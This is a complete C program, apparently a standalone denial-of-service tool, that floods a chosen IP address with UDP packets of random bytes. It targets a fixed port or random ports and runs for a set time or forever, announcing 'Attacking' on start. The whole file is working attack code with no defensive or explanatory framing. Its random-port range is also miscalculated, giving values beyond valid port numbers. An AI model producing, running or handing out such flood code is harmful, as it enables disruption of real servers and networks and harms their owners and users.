#include <arpa/inet.h>
#include <netinet/in.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

void udp_flood(const char *ip, int port, int duration, int packet_size) {
    bool random_port = (port == 0);

    printf("Attacking: %s:%d for %d seconds\n", ip, port, duration);

    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("Error creating socket");
        exit(1);
    }

    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_addr.s_addr = inet_addr(ip);

    unsigned char bytes[packet_size];
    for (int i = 0; i < packet_size; ++i) {
        bytes[i] = rand() % 256;
    }

    time_t start_time = time(NULL);
    time_t end_time = start_time + duration;

    while (true) {
        if (random_port) {
            port = rand() % 15000000 + 1;
        }
        dest_addr.sin_port = htons(port);

        sendto(sock, bytes, packet_size, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

        if (duration > 0 && time(NULL) >= end_time) {
            break;
        }
    }

    printf("DONE\n");
    close(sock);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        fprintf(stderr, "Usage: %s ip port(0=random) duration(0=forever) packet_size\n", argv[0]);
        exit(1);
    }

    const char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int packet_size = atoi(argv[4]);

    udp_flood(ip, port, duration, packet_size);

    return 0;
}
